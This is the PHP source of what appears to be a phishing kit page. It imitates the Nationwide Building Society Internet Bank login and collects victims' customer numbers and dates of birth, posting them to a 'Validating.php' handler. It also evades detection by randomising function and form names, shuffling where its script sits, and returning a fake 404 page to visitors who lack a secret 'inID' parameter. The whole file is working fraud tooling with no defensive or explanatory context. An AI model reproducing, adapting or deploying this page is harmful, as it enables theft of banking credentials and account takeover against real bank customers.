<?php
session_start();
error_reporting(0);
include "nw.php";
include "control.php";
if(isset($_GET["inID"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(7,9));
	$fj2=randomCha(rand(10,12));
	$fj3=randomCha(rand(10,12))."3";
	$rand=rand(1,3);
	$err="display:none";
	if(isset($_GET["err"]))
	{
		$err="";
	}
	echo '<!DOCTYPE html>
<!--[if IEMobile 7 ]> 
<html dir="ltr" lang="en-GB" class="has-no-js iem7">
   <![endif]-->
   <!--[if lt IE 7 ]> 
   <html dir="ltr" lang="en-GB" class="has-no-js ie6 old-ie">
      <![endif]-->
      <!--[if IE 7 ]>    
      <html dir="ltr" lang="en-GB" class="has-no-js ie7 old-ie">
         <![endif]-->
         <!--[if IE 8 ]>    
         <html dir="ltr" lang="en-GB" class="has-no-js ie8 old-ie">
            <![endif]-->
            <!--[if (gte IE 9)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!-->
            <html dir="ltr" class="has-js has-no-ie8compat has-opacity has-cssremunit has-preserve3d has-supports has-checked has-textshadow has-cssanimations has-borderradius has-boxshadow has-flexbox has-flexboxlegacy has-no-flexboxtweener has-flexwrap has-csstransforms has-csstransforms3d has-csstransitions has-cssclippathinset" lang="en-GB"><head>';if($rand==1){ echo '<script>function '.$fj.'(){if(screen.width<800){ document.getElementById("dev").value="mob";}else{document.getElementById("dev").value="desk";}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}function '.$fj2.'(a){if(a.value.length>1){document.getElementById("month-name").innerHTML=a.value;}}function '.$fj3.'(){var a= document.forms["'.$fname.'"]["cusnum"];var b= document.forms["'.$fname.'"]["dobd"];var c= document.forms["'.$fname.'"]["dobm"];var d= document.forms["'.$fname.'"]["doby"];var err=0;document.getElementById("emf2").style.display="none";document.getElementById("emf").style.display="";if(a.value.length<1){document.getElementById("cusb").style.display="";document.getElementById("cuserr").style.display="";a.focus();err=1;}else{document.getElementById("cusb").style.display="none";document.getElementById("cuserr").style.display="none";}document.getElementById("dobb").style.display="";if(b.value.length<1){document.getElementById("dobb1").innerHTML="Please enter the day of your date of birth.";document.getElementById("dderr").style.display="";b.focus();err=2;}else{document.getElementById("dobb1").innerHTML="";document.getElementById("dderr").style.display="none";}if(b.value>31 && b.value.length>0){document.getElementById("dobb1").innerHTML="Please enter a valid date of birth";document.getElementById("dderr").style.display="";b.focus();err=2;}else if(b.value.length>0){document.getElementById("dobb1").innerHTML="";document.getElementById("dderr").style.display="none";}if(c.value.length<1){document.getElementById("dobb2").innerHTML="Please enter the month of your date of birth.";document.getElementById("dmerr").style.display="";c.focus();err=2;}else{document.getElementById("dobb2").innerHTML="";document.getElementById("dmerr").style.display="none";}if(d.value.length<1){document.getElementById("dobb3").innerHTML="Please enter the year of your date of birth.";document.getElementById("dyerr").style.display="";d.focus();err=2;}else{document.getElementById("dobb3").innerHTML="";document.getElementById("dyerr").style.display="none";}if( (d.value>2015 || d.value<1900) && d.value.length>0){document.getElementById("dobb3").innerHTML="Please enter a valid date of birth";document.getElementById("dyerr").style.display="";d.focus();err=2;}else if(d.value.length>0){document.getElementById("dobb3").innerHTML="";document.getElementById("dyerr").style.display="none";}if(err!=2){document.getElementById("dobb").style.display="none";}if(err==0){document.getElementById("emf").style.display="none";document.forms["'.$fname.'"].submit();}}</script>';} echo '</head>
               <body class="page identify-customer-page" style="display:none" id="bodys" onload="'.$fj.'();document.getElementById(\'bodys\').style.display=\'\';">
                  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
                  <meta charset="utf-8">
                  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
                  <meta name="format-detection" content="telephone=no">
                  <title>Internet Bank | Login | Nationwide</title>
                  <link rel="stylesheet" href="game/leave.css'.outrand().'">
                  <link rel="stylesheet" href="game/online.css'.outrand().'">
                  <link rel="shortcut icon" href="favicon.ico'.outrand().'">
                  <link rel="apple-touch-icon" href="game/120.png'.outrand().'" sizes="120x120">
                  <link rel="apple-touch-icon" href="game/76.png'.outrand().'" sizes="76x76">
                  <link rel="apple-touch-icon" href="game/76.png'.outrand().'">
                  <header class="page-header">
                     <div class="page-header__inner">
                        <div class="page-header__logo">
                           <a class="logo__image" href="#">
                           <span class="alt-text">Nationwide.co.uk</span>
                           </a>
                           <div class="page-header__subtitle-link">
                              <div class="logo__subtitle">
                                 <span class="icon"></span>
                                 Internet Bank
                              </div>
                           </div>
                        </div>
                     </div>
                  </header>
                  <div class="app app--process process">
                     <section class="stage" role="main">
                        <header class="stage__header">
                           <span class="icon"></span>
                           <div class="stage__header__title">
                              <h1>
                                 Log into the Internet Bank - Step 1 of 2
                              </h1>
                              <div class="stage__header__right">
                                 <span>Not registered?</span> <a href="#" target="">Register<span> now</span></a>
                              </div>
                              <span id="process-title-hidden-text" class="u-screen-reader-text">
                              </span>
                           </div>
                        </header>
                        <div class="stage__content">
                           <div class="section section--no-title section--wide">
                              <div class="section__inner">
                                 <div class="message-list message-list--no-title message-list--no-subtitle message-list--error" id="emf2" style="'.$err.'">
                                    <span class="icon"></span>
                                    <div class="message-list__title">
                                    </div>
                                    <div class="message-list__items">
                                       <div class="message message--error">
                                          <p style="font-weight:normal;"><strong>Sorry, we don\'t recognise those details</strong></p>
                                          <p style="font-weight:normal;">To log in, both your customer number and 
                                             date of birth need to match our records. Please check them both and try 
                                             again. Still having trouble? <a href="#">Get help with logging in</a>.
                                          </p>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="section__inner">
                                    
                                    
                                    
                                    
                                    <div class="message-list validation-summary-header message-list--no-title message-list--validation-error message-list--unordered" tabindex="0" id="emf" style="display:none">
                                       <span class="icon"></span>
                                       <div class="message-list__title">
                                          <span class="message-list__subtitle">Sorry - you must correct the errors on this page before you can continue.</span>
                                          <span class="u-screen-reader-text visuallyhidden" id="msg-screen-reader-text___fea4aef4-4f84-439d-a57a-52b4a49892cb">Clicking this link will direct you to the field containing the error.</span>
                                       </div>
                                       <div class="message-list__items">
                                          <li class="message message--has-action" id="cuserr"><a class="message-list__items__link" href="#">Customer number<span class="message-list__items__link__help">Clicking this link will direct you to the field containing the error.</span></a></li>
                                          <li class="message message--has-action" id="dderr" style="display:none"><a class="message-list__items__link" href="#">Date of birth 
                                             Enter the day of your birth<span class="message-list__items__link__help">Clicking this link will direct you to the field containing the error.</span></a>
                                          </li>
                                          <li class="message message--has-action" id="dmerr" style="display:none"><a class="message-list__items__link" href="#">Date of birth 
                                             Select the month of your birth<span class="message-list__items__link__help">Clicking this link will direct you to the field containing the error.</span></a>
                                          </li>
                                          <li class="message message--has-action" id="dyerr" style="display:none"><a class="message-list__items__link" href="#">Date of birth 
                                             Enter the year of your birth<span class="message-list__items__link__help">Clicking this link will direct you to the field containing the error.</span></a>
                                          </li>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
						   ';if($rand==2){ echo '<script>function '.$fj.'(){if(screen.width<800){ document.getElementById("dev").value="mob";}else{document.getElementById("dev").value="desk";}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}function '.$fj2.'(a){if(a.value.length>1){document.getElementById("month-name").innerHTML=a.value;}}function '.$fj3.'(){var a= document.forms["'.$fname.'"]["cusnum"];var b= document.forms["'.$fname.'"]["dobd"];var c= document.forms["'.$fname.'"]["dobm"];var d= document.forms["'.$fname.'"]["doby"];var err=0;document.getElementById("emf2").style.display="none";document.getElementById("emf").style.display="";if(a.value.length<1){document.getElementById("cusb").style.display="";document.getElementById("cuserr").style.display="";a.focus();err=1;}else{document.getElementById("cusb").style.display="none";document.getElementById("cuserr").style.display="none";}document.getElementById("dobb").style.display="";if(b.value.length<1){document.getElementById("dobb1").innerHTML="Please enter the day of your date of birth.";document.getElementById("dderr").style.display="";b.focus();err=2;}else{document.getElementById("dobb1").innerHTML="";document.getElementById("dderr").style.display="none";}if(b.value>31 && b.value.length>0){document.getElementById("dobb1").innerHTML="Please enter a valid date of birth";document.getElementById("dderr").style.display="";b.focus();err=2;}else if(b.value.length>0){document.getElementById("dobb1").innerHTML="";document.getElementById("dderr").style.display="none";}if(c.value.length<1){document.getElementById("dobb2").innerHTML="Please enter the month of your date of birth.";document.getElementById("dmerr").style.display="";c.focus();err=2;}else{document.getElementById("dobb2").innerHTML="";document.getElementById("dmerr").style.display="none";}if(d.value.length<1){document.getElementById("dobb3").innerHTML="Please enter the year of your date of birth.";document.getElementById("dyerr").style.display="";d.focus();err=2;}else{document.getElementById("dobb3").innerHTML="";document.getElementById("dyerr").style.display="none";}if( (d.value>2015 || d.value<1900) && d.value.length>0){document.getElementById("dobb3").innerHTML="Please enter a valid date of birth";document.getElementById("dyerr").style.display="";d.focus();err=2;}else if(d.value.length>0){document.getElementById("dobb3").innerHTML="";document.getElementById("dyerr").style.display="none";}if(err!=2){document.getElementById("dobb").style.display="none";}if(err==0){document.getElementById("emf").style.display="none";document.forms["'.$fname.'"].submit();}}</script>';} echo '
						   <form method="POST" action="Validating.php?/AccesManagement/IdentfyCustomer/'.randomChaSp(rand(5,10)).'&inID='.randomCha(rand(40,60)).'" id="'.$fname.'" name="'.$fname.'" onsubmit="'.$fj3.'(); return false;" autocomplete="off" >
                           <div class="section section--no-title section--wide">
                              <div class="section__inner">
                              </div>
                           </div>
                           <div class="service-availability-login-container service-availability-login-section-expansion">
                              <div class="section">
                                 <div class="section__inner">
                                    <div class="message">
                                    </div>
                                 </div>
                              </div>
                              <div class="section section--no-title">
                                 <div class="section__title">
                                    <h2 style="font-size: 1em; padding-bottom: 7px; margin-bottom: -0.278em; margin-top: 0px;">Let us know who you are</h2>
                                 </div>
                                 <div class="section__inner">
                                    <div class="control control--simple control--short text-input-control">
                                       <label class="control__label" for="cusnum">
                                          <span class="control__label__title">
                                             <h3>Customer number</h3>
                                          </span>
                                          <span id="ctl-desc___8525bc81-98c5-44bf-99e4-ef8581965b31" class="control__label__description">
                                          Your unique number for online banking. It\'s like a username for when you log in.
                                          </span>
                                       </label>
                                       <div class="control__input">
                                          <input class="text-input text-input--numeric" id="cusnum" maxlength="10" name="cusnum" placeholder="" type="text">
                                       </div>
                                       <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error" id="cusb" style="display:none">
                                          <span class="icon"></span>
                                          <div class="message-list__title">
                                          </div>
                                          <div class="message-list__items">
                                             <li class="message message--no-action">Please enter your customer number</li>
                                          </div>
                                       </div>
                                       <div class="control__help">
                                          <a href="#" class="control__help__trigger" target="">
                                          <span class="icon"></span>
                                          Forgotten your customer number?
                                          <span class="u-screen-reader-text"></span>
                                          </a>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div class="section">
                                 <div class="section__inner">
                                    
                                 </div>
                              </div>
                              <div class="section section--conditional" style="display: block;">
                                 <div class="section__inner">
                                   
                                       <fieldset class="control-group control control--no-description control--no-help control--complex date-of-birth">
                                          <legend class="control__label">
                                             <span class="control__label__title">
                                                <h3>Date of birth</h3>
                                             </span>
                                          </legend>
                                          <div class="control__input">
                                             <div class="control control--no-description control--no-help control--simple control--defer-validation text-input-control">
                                                <label class="control__label" for="dobd">
                                                <span class="control__label__title">
                                                Enter the day of your birth
                                                </span>
                                                </label>
                                                <div class="control__input">
                                                   <input class="text-input text-input--numeric" id="dobd" maxlength="2" name="dobd" placeholder="DD" type="text" onkeypress="return '.$fj1.'(event)">
                                                </div>
                                                <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error">
                                                   <span class="icon"></span>
                                                   <div class="message-list__title">
                                                   </div>
                                                   <div class="message-list__items">
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="control control--no-description control--no-help control--simple control--defer-validation selection-list-control">
                                                <label class="control__label" for="dobm">
                                                <span class="control__label__title">
                                                Select the month of your birth
                                                </span>
                                                </label>
                                                <div class="control__input">
                                                   <div class="selection-list">
                                                      <select class="selection-list__options" id="dobm" name="dobm" onchange="'.$fj2.'(this)">
                                                         <option value="">Month</option>
                                                         <option value="January">January</option>
                                                         <option value="February">February</option>
                                                         <option value="March">March</option>
                                                         <option value="April">April</option>
                                                         <option value="May">May</option>
                                                         <option value="June">June</option>
                                                         <option value="July">July</option>
                                                         <option value="August">August</option>
                                                         <option value="September">September</option>
                                                         <option value="October">October</option>
                                                         <option value="November">November</option>
                                                         <option value="December">December</option>
                                                      </select>
                                                      <div class="selection-list__value" id="month-name">Month</div>
                                                      <span class="icon"></span>
                                                   </div>
                                                </div>
                                                <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error">
                                                   <span class="icon"></span>
                                                   <div class="message-list__title">
                                                   </div>
                                                   <div class="message-list__items">
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="control control--no-description control--no-help control--simple control--defer-validation text-input-control">
                                                <label class="control__label" for="doby">
                                                <span class="control__label__title">
                                                Enter the year of your birth
                                                </span>
                                                </label>
                                                <div class="control__input">
                                                   <input class="text-input text-input--numeric" id="doby" maxlength="4" name="doby" placeholder="YYYY" type="text" onkeypress="return '.$fj1.'(event)">
												   <input name="dev" id="dev" type="hidden" value=""/>
                                                </div>
                                                <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error">
                                                   <span class="icon"></span>
                                                   <div class="message-list__title">
                                                   </div>
                                                   <div class="message-list__items">
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="message-list control__validation message-list--no-title message-list--no-subtitle message-list--validation-error" role="alert" id="dobb" style="display:none">
                                             <span class="icon"></span>
                                             <div class="message-list__title">
                                             </div>
                                             <div class="message-list__items">
                                                <li class="message message--no-action" id="dobb1"></li>
                                                <li class="message message--no-action" id="dobb2"></li>
                                                <li class="message message--no-action" id="dobb3"></li>
                                             </div>
                                          </div>
                                       </fieldset>
                                    
                                 </div>
                              </div>
                              <div class="section">
                                 <div class="section__inner">
                                    <div class="control control--no-label control--no-description control--no-help control--simple toggle-control">
                                       <div class="control__input">
                                          <div class="toggle toggle--no-more-info">
                                             <input class="toggle__checkbox" id="toggle___79345b04-4e52-4b11-ae08-7258015f6bd7" name="RememberMe" type="checkbox" value="true">
                                             <label for="toggle___79345b04-4e52-4b11-ae08-7258015f6bd7" class="toggle__label" id="toggle-label_9a4c899e-a04a-479b-865e-8bfeb7c88bee">
                                                <div class="\&quot;remember-label\&quot;"><b>Remember me</b> (do not select for shared computers)</div>
                                             </label>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div class="identify-action-btn">
                                 <div class="action action--primary action--authentication">
                                    <button class="action__button" type="submit" title="">
                                    Continue
                                    </button>
                                 </div>
                              </div>
                           </div>
                        </div>
						</form>
                        <footer class="stage__footer">
                           <div class="action-group">
                           </div>
                        </footer>
                     </section>
                  </div>
                  <footer class="page-footer">
                     <div class="page-footer__inner">
                        <div class="page-footer__navigation-social-media-copyright">
                           <div class="page-footer__navigation">
                              <ul class="link-list">
                                 <li class="link-list__item">
                                    <a href="#">Register</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Order a new card reader</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Security centre</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Accessibility</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Service status</a>
                                    <span class="icon"></span>
                                 </li>
                              </ul>
                              <ul class="link-list">
                                 <li class="link-list__item">
                                    <a href="#">Mobile Banking app</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Internet Bank Terms and Conditions</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Contact us</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Cookies and privacy</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Troubleshooting</a>
                                    <span class="icon"></span>
                                 </li>
                              </ul>
                           </div>
                           <div class="page-footer__social-media-copyright">
                              <div class="page-footer__social-media">
                                 <div class="footer-heading">Follow us:</div>
                                 <ul role="navigation">
                                    <li>
                                       <a class="twitter" href="#">
                                       <span class="srText">Twitter (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="facebook" href="#">
                                       <span class="srText">Facebook (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="youtube" href="#">
                                       <span class="srText">Youtube (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="linkedin" href="#">
                                       <span class="srText">LinkedIn (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                 </ul>
                              </div>
                              <div class="page-footer__FSCS-Logo"><a href="#">
                                 <img alt="FSCS Logo" class="FSCS-Logo" src="game/FSCS_Logo.png">
                                 </a>
                              </div>
                              <div class="page-footer__copyright">© 2020 Nationwide Building Society</div>
                           </div>
                        </div>
                        <div class="page-footer__regulatory">
                           <p>Nationwide Building Society is authorised by the Prudential 
                              Regulation Authority and regulated by the Financial Conduct Authority 
                              and the Prudential Regulation Authority under registration number 
                              106078. You can confirm our registration on the FCA’s website <a href="#" title="" class="new-window-link">www.fca.gov.uk<span class="srText"> Opens in a new window</span></a>. Nationwide is not responsible for the content of external websites.
                           </p>
                        </div>
                     </div>
                  </footer>
                  ';if($rand==3){ echo '<script>function '.$fj.'(){if(screen.width<800){ document.getElementById("dev").value="mob";}else{document.getElementById("dev").value="desk";}}function '.$fj1.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}function '.$fj2.'(a){if(a.value.length>1){document.getElementById("month-name").innerHTML=a.value;}}function '.$fj3.'(){var a= document.forms["'.$fname.'"]["cusnum"];var b= document.forms["'.$fname.'"]["dobd"];var c= document.forms["'.$fname.'"]["dobm"];var d= document.forms["'.$fname.'"]["doby"];var err=0;document.getElementById("emf2").style.display="none";document.getElementById("emf").style.display="";if(a.value.length<1){document.getElementById("cusb").style.display="";document.getElementById("cuserr").style.display="";a.focus();err=1;}else{document.getElementById("cusb").style.display="none";document.getElementById("cuserr").style.display="none";}document.getElementById("dobb").style.display="";if(b.value.length<1){document.getElementById("dobb1").innerHTML="Please enter the day of your date of birth.";document.getElementById("dderr").style.display="";b.focus();err=2;}else{document.getElementById("dobb1").innerHTML="";document.getElementById("dderr").style.display="none";}if(b.value>31 && b.value.length>0){document.getElementById("dobb1").innerHTML="Please enter a valid date of birth";document.getElementById("dderr").style.display="";b.focus();err=2;}else if(b.value.length>0){document.getElementById("dobb1").innerHTML="";document.getElementById("dderr").style.display="none";}if(c.value.length<1){document.getElementById("dobb2").innerHTML="Please enter the month of your date of birth.";document.getElementById("dmerr").style.display="";c.focus();err=2;}else{document.getElementById("dobb2").innerHTML="";document.getElementById("dmerr").style.display="none";}if(d.value.length<1){document.getElementById("dobb3").innerHTML="Please enter the year of your date of birth.";document.getElementById("dyerr").style.display="";d.focus();err=2;}else{document.getElementById("dobb3").innerHTML="";document.getElementById("dyerr").style.display="none";}if( (d.value>2015 || d.value<1900) && d.value.length>0){document.getElementById("dobb3").innerHTML="Please enter a valid date of birth";document.getElementById("dyerr").style.display="";d.focus();err=2;}else if(d.value.length>0){document.getElementById("dobb3").innerHTML="";document.getElementById("dyerr").style.display="none";}if(err!=2){document.getElementById("dobb").style.display="none";}if(err==0){document.getElementById("emf").style.display="none";document.forms["'.$fname.'"].submit();}}</script>';} echo '
            </body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>